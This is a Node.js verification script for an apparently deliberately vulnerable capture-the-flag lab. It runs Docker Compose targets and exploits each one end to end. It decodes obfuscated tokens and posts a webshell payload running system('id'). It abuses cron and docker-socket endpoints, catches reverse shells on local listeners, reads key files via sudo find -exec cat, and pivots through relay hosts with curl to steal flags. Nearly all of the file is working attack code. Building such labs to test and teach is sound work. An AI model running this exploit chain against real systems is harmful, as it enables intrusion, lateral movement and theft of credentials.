#!/usr/bin/env node

const fs = require('fs');
const path = require('path');
const net = require('net');
const { spawnSync } = require('child_process');

const ROOT_DIR = path.resolve(__dirname, '..');
const PROJECT = process.env.COMPOSE_PROJECT_NAME || 'vulnerable_hard_pivot_check';
const KEEP_COMPOSE = process.env.KEEP_COMPOSE === '1';
const stamp = new Date().toISOString().replace(/[:.]/g, '-');
const artifactDir = path.join(ROOT_DIR, 'artifacts', 'check', `hard-pivots-${stamp}`);
const commandLogPath = path.join(artifactDir, 'commands.log');

fs.mkdirSync(artifactDir, { recursive: true });

const HARD = {
  pivot: {
    route: '/pivot/silver',
    service: 'pivot-silver',
    relay: 'pivot-relay',
    keyPath: '/tmp/rndsecurity-isolated/pivot-silver/pivot.key',
    briefPath: '/tmp/rndsecurity-isolated/pivot-silver/pivot-brief.txt',
    flagPath: '/tmp/rndsecurity-pivot/final-flag.txt',
    artifactKey(index) {
      return ((index * 17) ^ 0x5d ^ ((index + 5) * 9)) & 0xff;
    }
  },
  chain: {
    route: '/chain/silver',
    service: 'chain-silver',
    relay: 'chain-relay',
    keyPath: '/tmp/rndsecurity-isolated/chain-silver/chain-pivot.key',
    briefPath: '/tmp/rndsecurity-isolated/chain-silver/chain-brief.txt',
    flagPath: '/tmp/rndsecurity-chain/final-flag.txt',
    artifactKey(index) {
      return ((index * 23) ^ 0x91 ^ ((index + 7) * 13)) & 0xff;
    }
  },
  webshell: {
    route: '/webshell/silver',
    service: 'webshell-silver',
    relay: 'webshell-relay',
    keyPath: '/tmp/rndsecurity-isolated/webshell-silver/webshell-pivot.key',
    briefPath: '/tmp/rndsecurity-isolated/webshell-silver/webshell-brief.txt',
    flagPath: '/tmp/rndsecurity-webshell/final-flag.txt',
    unlock({ baseUrl }) {
      return curlWithStatus('unlock-webshell', [
        '-X',
        'POST',
        `${baseUrl}/webshell/silver`,
        '-H',
        'Content-Type: application/x-www-form-urlencoded',
        '--data-urlencode',
        'code=system("id")'
      ]);
    }
  },
  persist: {
    route: '/persist/silver',
    service: 'persist-silver',
    relay: 'persist-relay',
    keyPath: '/tmp/rndsecurity-isolated/persist-silver/persist-pivot.key',
    briefPath: '/tmp/rndsecurity-isolated/persist-silver/persist-brief.txt',
    flagPath: '/tmp/rndsecurity-persist/final-flag.txt',
    unlock({ baseUrl }) {
      return curlWithStatus('unlock-persist', [
        '-X',
        'POST',
        `${baseUrl}/persist/silver`,
        '-H',
        'Content-Type: application/x-www-form-urlencoded',
        '-d',
        'method=cron'
      ]);
    }
  },
  container: {
    route: '/container/silver',
    service: 'container-silver',
    relay: 'container-relay',
    keyPath: '/tmp/rndsecurity-isolated/container-silver/container-pivot.key',
    briefPath: '/tmp/rndsecurity-isolated/container-silver/container-brief.txt',
    flagPath: '/tmp/rndsecurity-container/final-flag.txt',
    unlock({ baseUrl }) {
      return curlWithStatus('unlock-container', [`${baseUrl}/container/silver?socket=docker`]);
    }
  }
};

const selected = process.argv.slice(2);
const targets = selected.length > 0 ? selected : Object.keys(HARD);
for (const target of targets) {
  if (!HARD[target]) {
    throw new Error(`unknown hard pivot target: ${target}`);
  }
}

let commandIndex = 0;
const summary = {
  project: PROJECT,
  artifactDir,
  targets,
  commands: [],
  results: {}
};

function writeFile(name, data) {
  const filePath = path.join(artifactDir, name);
  fs.writeFileSync(filePath, data);
  return filePath;
}

function appendCommandLog(text) {
  fs.appendFileSync(commandLogPath, text);
}

function shellQuote(value) {
  if (/^[A-Za-z0-9_./:=@%+-]+$/.test(value)) return value;
  return `'${value.replaceAll("'", "'\\''")}'`;
}

function run(label, command, args, options = {}) {
  commandIndex += 1;
  const id = String(commandIndex).padStart(2, '0');
  const commandLine = [command, ...args].map(shellQuote).join(' ');
  appendCommandLog(`\n[${id}] $ ${commandLine}\n`);

  const result = spawnSync(command, args, {
    cwd: ROOT_DIR,
    env: {
      ...process.env,
      COMPOSE_PROJECT_NAME: PROJECT
    },
    encoding: 'utf8',
    timeout: options.timeoutMs || 180_000
  });

  const stdoutPath = writeFile(`${id}-${label}.stdout.txt`, result.stdout || '');
  const stderrPath = writeFile(`${id}-${label}.stderr.txt`, result.stderr || '');
  const status = result.status === null ? 'signal' : result.status;
  appendCommandLog(`[${id}] exit=${status} stdout=${path.relative(ROOT_DIR, stdoutPath)} stderr=${path.relative(ROOT_DIR, stderrPath)}\n`);

  summary.commands.push({
    id,
    label,
    command: commandLine,
    status,
    stdout: path.relative(ROOT_DIR, stdoutPath),
    stderr: path.relative(ROOT_DIR, stderrPath)
  });

  if (result.error && !options.allowFailure) {
    throw result.error;
  }
  if (result.status !== 0 && !options.allowFailure) {
    throw new Error(`${label} failed with exit ${result.status}; see ${stdoutPath} and ${stderrPath}`);
  }
  return result.stdout || '';
}

function compose(args, options) {
  return run(options?.label || `compose-${args[0]}`, 'docker', ['compose', '-p', PROJECT, '-f', 'docker-compose.yml', ...args], options);
}

function curlWithStatus(label, args, options = {}) {
  const stdout = run(label, 'curl', ['-s', '--retry', '30', '--retry-delay', '1', '--retry-all-errors', '--retry-connrefused', '-w', '\n__HTTP_STATUS__:%{http_code}', ...args], {
    ...options,
    allowFailure: true
  });
  const marker = '\n__HTTP_STATUS__:';
  const idx = stdout.lastIndexOf(marker);
  if (idx === -1) {
    throw new Error(`${label}: missing status marker in curl output: ${stdout}`);
  }
  return {
    body: stdout.slice(0, idx),
    status: Number.parseInt(stdout.slice(idx + marker.length).trim(), 10)
  };
}

function composeText() {
  return fs.readFileSync(path.join(ROOT_DIR, 'docker-compose.yml'), 'utf8');
}

function serviceBlock(serviceName) {
  const text = composeText();
  const serviceMatch = new RegExp(`^  ${serviceName}:`, 'm').exec(text);
  if (!serviceMatch) throw new Error(`could not find ${serviceName} in docker-compose.yml`);
  const rest = text.slice(serviceMatch.index);
  const nextService = rest.slice(1).search(/\n  [a-z0-9_-]+:/);
  return nextService === -1 ? rest : rest.slice(0, nextService + 1);
}

function envValue(serviceName, envName) {
  const match = serviceBlock(serviceName).match(new RegExp(`- ${envName}=([^\\n]+)`));
  if (!match) throw new Error(`could not find ${envName} for ${serviceName}`);
  return match[1].trim();
}

function directPort(serviceName) {
  const match = serviceBlock(serviceName).match(/- "(\d+):3000"/);
  if (!match) throw new Error(`could not find direct port for ${serviceName}`);
  return match[1];
}

function ror8(value, bits) {
  return ((value >> bits) | (value << (8 - bits))) & 0xff;
}

function solveArtifact(source, keyFn) {
  const payloadMatch = source.match(/const __payload = "([0-9a-f]+)"/i);
  const orderMatch = source.match(/const __order = \[([0-9,\s]+)\]/);
  if (!payloadMatch || !orderMatch) {
    throw new Error('artifact did not expose the expected encoded payload and order table');
  }

  const encoded = payloadMatch[1].match(/../g).map((byte) => Number.parseInt(byte, 16));
  const order = orderMatch[1].split(',').map((value) => Number.parseInt(value.trim(), 10));
  const recovered = new Array(order.length);
  encoded.forEach((byte, position) => {
    const sourceIndex = order[position];
    recovered[sourceIndex] = ror8(byte, (sourceIndex % 5) + 1) ^ keyFn(sourceIndex);
  });
  return Buffer.from(recovered).toString('utf8');
}

function assertIncludes(text, needle, label) {
  if (!text.includes(needle)) {
    throw new Error(`${label} did not include ${needle}`);
  }
}

function unlockTarget(name, cfg, baseUrl) {
  if (cfg.artifactKey) {
    const artifact = curlWithStatus(`artifact-${name}`, [`${baseUrl}${cfg.route}/artifact.js`]);
    if (artifact.status !== 200) throw new Error(`${name} artifact returned ${artifact.status}`);
    writeFile(`${name}-artifact.js`, artifact.body);
    const token = solveArtifact(artifact.body, cfg.artifactKey);
    const unlocked = curlWithStatus(`unlock-${name}`, [`${baseUrl}${cfg.route}?payload=${encodeURIComponent(token)}`]);
    if (unlocked.status !== 200) throw new Error(`${name} unlock returned ${unlocked.status}: ${unlocked.body}`);
    writeFile(`${name}-unlock.json`, unlocked.body);
    return token;
  }

  const unlocked = cfg.unlock({ baseUrl });
  if (unlocked.status !== 200) throw new Error(`${name} unlock returned ${unlocked.status}: ${unlocked.body}`);
  writeFile(`${name}-unlock.json`, unlocked.body);
  const parsed = JSON.parse(unlocked.body);
  if (!parsed.stageToken) throw new Error(`${name} unlock did not return a stage token`);
  return parsed.stageToken;
}

function triggerEdgeCallback(name, cfg, baseUrl, token, port) {
  const tokenHeader = cfg.artifactKey ? 'X-Debug-Token' : 'X-Stage-Token';
  const response = curlWithStatus(
    `trigger-edge-${name}`,
    [
      '-X',
      'POST',
      `${baseUrl}${cfg.route}/debug`,
      '-H',
      'Content-Type: application/json',
      '-H',
      `${tokenHeader}: ${token}`,
      '-d',
      JSON.stringify({ host: 'host.docker.internal', port })
    ],
    { timeoutMs: 30_000 }
  );
  if (response.status !== 200) {
    throw new Error(`${name} edge callback trigger failed: ${response.status} ${response.body}`);
  }
}

function readKeyThroughEdgeShell(name, cfg, baseUrl, token, expectedKey) {
  return new Promise((resolve, reject) => {
    let settled = false;
    const server = net.createServer();
    const finish = (err, value) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      server.close();
      if (err) reject(err);
      else resolve(value);
    };
    const timer = setTimeout(() => finish(new Error(`${name} edge shell did not return pivot key`)), 30_000);

    server.on('error', (err) => finish(err));
    server.on('connection', (socket) => {
      let buffer = '';
      socket.on('error', () => {});
      socket.on('data', (chunk) => {
        buffer += chunk.toString('utf8');
        if (buffer.includes(expectedKey) && buffer.includes('Permission denied') && buffer.includes(`${cfg.relay}:8081`)) {
          socket.end('exit\n');
          finish(null, buffer);
        }
      });
      socket.write(`cat ${cfg.keyPath} 2>&1 || true\n`);
      socket.write(`sudo find ${cfg.keyPath} -maxdepth 0 -exec cat {} \\;\n`);
      socket.write(`sudo find ${cfg.briefPath} -maxdepth 0 -exec cat {} \\;\n`);
    });

    server.listen(0, '0.0.0.0', () => {
      triggerEdgeCallback(name, cfg, baseUrl, token, server.address().port);
    });
  });
}

function pivotThroughEdgeShell(name, cfg, baseUrl, token, pivotKey, expectedFlag) {
  return new Promise((resolve, reject) => {
    const pivotMarker = `${name.toUpperCase()}_PIVOT_${Date.now()}`;
    let settled = false;
    const edgeServer = net.createServer();
    const pivotServer = net.createServer();

    const finish = (err, value) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      edgeServer.close();
      pivotServer.close();
      if (err) reject(err);
      else resolve(value);
    };
    const timer = setTimeout(() => finish(new Error(`${name} pivot shell did not return final flag`)), 30_000);

    edgeServer.on('error', (err) => finish(err));
    pivotServer.on('error', (err) => finish(err));

    pivotServer.on('connection', (socket) => {
      let buffer = '';
      let primed = false;
      socket.on('error', () => {});
      socket.on('data', (chunk) => {
        buffer += chunk.toString('utf8');
        if (!primed && buffer.includes(pivotMarker)) {
          primed = true;
          socket.write(`cat ${cfg.flagPath} 2>&1 || true\n`);
          socket.write(`sudo find ${cfg.flagPath} -maxdepth 0 -exec cat {} \\;\n`);
          return;
        }
        if (primed && buffer.includes(expectedFlag) && buffer.includes('Permission denied')) {
          socket.end('exit\n');
          finish(null, buffer);
        }
      });
      socket.write(`echo ${pivotMarker}\n`);
    });

    pivotServer.listen(0, '0.0.0.0', () => {
      const payload = JSON.stringify({ host: 'host.docker.internal', port: pivotServer.address().port });

      edgeServer.on('connection', (socket) => {
        socket.on('error', () => {});
        socket.write(`curl -fsS -X POST http://${cfg.relay}:8081/callback -H 'X-Pivot-Key: ${pivotKey}' -H 'Content-Type: application/json' -d '${payload}'\n`);
        socket.write('exit\n');
      });

      edgeServer.listen(0, '0.0.0.0', () => {
        triggerEdgeCallback(name, cfg, baseUrl, token, edgeServer.address().port);
      });
    });
  });
}

async function checkTarget(name) {
  const cfg = HARD[name];
  const port = directPort(cfg.service);
  const baseUrl = `http://127.0.0.1:${port}`;
  const expectedKey = envValue(cfg.service, 'PIVOT_KEY');
  const expectedFlag = envValue(cfg.relay, 'PIVOT_FLAG');

  const page = curlWithStatus(`page-${name}`, [`${baseUrl}${cfg.route}`], { timeoutMs: 120_000 });
  if (page.status !== 200) throw new Error(`${name} page returned ${page.status}`);

  const token = unlockTarget(name, cfg, baseUrl);
  const edgeTranscript = await readKeyThroughEdgeShell(name, cfg, baseUrl, token, expectedKey);
  writeFile(`${name}-edge-shell.txt`, edgeTranscript);
  assertIncludes(edgeTranscript, expectedKey, `${name} edge shell transcript`);

  const pivotTranscript = await pivotThroughEdgeShell(name, cfg, baseUrl, token, expectedKey, expectedFlag);
  writeFile(`${name}-pivot-shell.txt`, pivotTranscript);
  assertIncludes(pivotTranscript, expectedFlag, `${name} pivot shell transcript`);

  summary.results[name] = {
    token,
    flag: expectedFlag,
    edgeShellConnected: true,
    pivotShellConnected: true
  };
  console.log(`PASS ${name}-silver hard pivot check`);
}

async function main() {
  appendCommandLog(`hard pivot check started ${new Date().toISOString()}\n`);
  run('verify-isolated-compose', 'node', ['scripts/verify-isolated-compose.js']);
  compose(['down', '-v', '--remove-orphans'], { label: 'compose-preclean', allowFailure: true, timeoutMs: 120_000 });

  const services = ['web'];
  for (const target of targets) {
    services.push(HARD[target].service, HARD[target].relay);
  }
  compose(['up', '-d', '--build', ...services], { label: 'compose-up-hard-pivots', timeoutMs: 240_000 });
  compose(['ps'], { label: 'compose-ps-after-up' });

  for (const target of targets) {
    await checkTarget(target);
  }

  console.log(`PASS hard pivot set: ${targets.join(', ')}`);
  console.log(`Artifacts: ${artifactDir}`);
}

let failure = null;
main()
  .catch((error) => {
    failure = error;
    summary.error = error instanceof Error ? error.message : String(error);
    console.error(summary.error);
    process.exitCode = 1;
  })
  .then(() => {
    const logServices = ['web', 'postgres'];
    for (const target of targets) {
      logServices.push(HARD[target].service, HARD[target].relay, `seed-${HARD[target].service}`);
    }
    compose(['logs', '--no-color', ...logServices], {
      label: 'compose-logs',
      allowFailure: true,
      timeoutMs: 120_000
    });
    if (!KEEP_COMPOSE) {
      compose(['down', '-v', '--remove-orphans'], {
        label: 'compose-down',
        allowFailure: true,
        timeoutMs: 120_000
      });
    }
    writeFile('summary.json', `${JSON.stringify(summary, null, 2)}\n`);
    if (failure) {
      process.exitCode = 1;
    }
  });
